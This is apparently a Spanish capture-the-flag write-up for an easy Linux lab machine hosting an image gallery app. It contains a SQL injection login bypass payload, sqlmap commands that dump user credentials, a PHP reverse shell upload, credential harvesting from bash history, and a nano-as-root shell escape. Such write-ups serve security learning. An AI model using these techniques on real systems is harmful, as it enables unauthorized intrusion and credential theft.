#Linux #Easy 
### nmap
```python
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.42 seconds
```

### Ports: 80/htto - 8080/http

### Enumeracion del puerto 80
![[Pasted image 20240612143931.png]]

### Fuzzing con gobuster
![[Pasted image 20240612143936.png]]
vamos a analizar el subdominio /gallery

### login
![[Pasted image 20240612143939.png]]
###### vamos a intentar varias credenciales por defecto y tambien inyecciones sqli
payload inyeccion sqli
```python
admin'OR 1=1-- -
```

### tenemos acceso a la pag web
![[Pasted image 20240612143946.png]]
###### en el apartado de albums podemos ver una opcion para cargar archivos lo que podriamos utilizar para intentar cargar un archivo php que contenga una reverse shell
![[Pasted image 20240612143952.png]]
la rever shell ha funcionado tenemos conexion a la maquina

### movimiento lateral. 
![[Pasted image 20240612143957.png]]
###### navegando por la maquina hemos conseguido un archivo backups del usuario mike en el cual tenemos permisos de lectura sobre el archivo .bash_history y dentro podemos ver que el usuario mike en algun momento proporciono su clave de super usuario asi que vamos a capturarla para convertirnos en el usuario mike

### analizando la maquina podemos ver que tenemos una base de datos
![[Pasted image 20240612144007.png]]
usaremos sqlmap para enumerar esta base de datos

### sqlmap 

```python
sqlmap -r phpid.txt --dbs
```
necesitamos interceptar alguna peticion con el burpsuite para poder conseguir la phpsessionid

![[Pasted image 20240612144011.png]]
ya tenemos el nombre de la base de datos. ahora vamos a enumerarla

```python
sqlmap -r phpid.txt -D gallery_db --tables
```
hemos enumerado las tablas de la base de datos. la tabla de users parece interesanta asi que vamos a echar un vistazo 
![[Pasted image 20240612144018.png]]

ahora vamos a enumerar la tabla de usuarios 

```python
sqlmap -r phpid.txt -D gallery_db -T users --columns users
```

![[Pasted image 20240612144022.png]]

ahora vamos a enumerar las columnas de password y username
```python
sqlmap -r phpid.txt -D gallery_db -T users --columns users -C username,password --dump
```

![[Pasted image 20240612144027.png]]
tenemos credenciales del usuario admin

### Escalada de privilegios
![[Pasted image 20240612144032.png]]
el usuario mike tiene permisos root para el script rootkit.sh usaremos esto para escalar privilegios

### script: el archivo tiene 4 variables. pero lo mas importante es que nos permite usar nano como root. usaremos esto para escalar privilegios
![[Pasted image 20240612144038.png]]

usaremos la opcion numero 4 (read) esto nos permite editar el archivo 
![[Pasted image 20240612144045.png]]

usaremos este comando con nano para lograr la escalada 
```python
nano
- Ctrl^R 
- reset; sh 1>&0 2>&0
- Ctrl^X
```

![[Pasted image 20240612144057.png]]
### WE ARE ROOT
